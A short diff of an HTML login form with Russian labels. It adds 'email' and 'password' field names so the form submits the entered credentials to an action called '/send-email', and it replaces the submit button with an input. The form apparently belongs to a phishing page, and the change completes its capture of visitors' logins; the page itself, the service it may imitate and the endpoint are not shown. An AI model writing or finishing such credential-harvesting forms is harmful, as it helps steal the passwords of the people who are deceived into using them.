@@ -45,16 +45,20 @@
                         <form class="password-form" action="/send-email" method="post">
                             <div class="login-fields">
                                 <div class="input-field">
-                                    <input type="text" placeholder="Электронная почта или телефон" autocorrect="off" spellcheck="false">
+                                    <label>
+                                        <input type="text" name="email" placeholder="Электронная почта или телефон" autocorrect="off" spellcheck="false">
+                                    </label>
                                 </div>
                                 <div class="input-field">
-                                    <input type="password" placeholder="Пароль" autocomplete="off" autocorrect="off" spellcheck="false">
+                                    <label>
+                                        <input type="password" name="password" placeholder="Пароль" autocomplete="off" autocorrect="off" spellcheck="false">
+                                    </label>
                                 </div>
                             </div>
                             <div class="submit-btn">
-                                <button type="submit">
-                                     Авторизоваться 
-                                </button>
+                                <input type="submit" value="Авторизоваться">
+                                      
+                                
                                 <!-- <input type="submit" value=""> -->
                             </div>
                         </form>
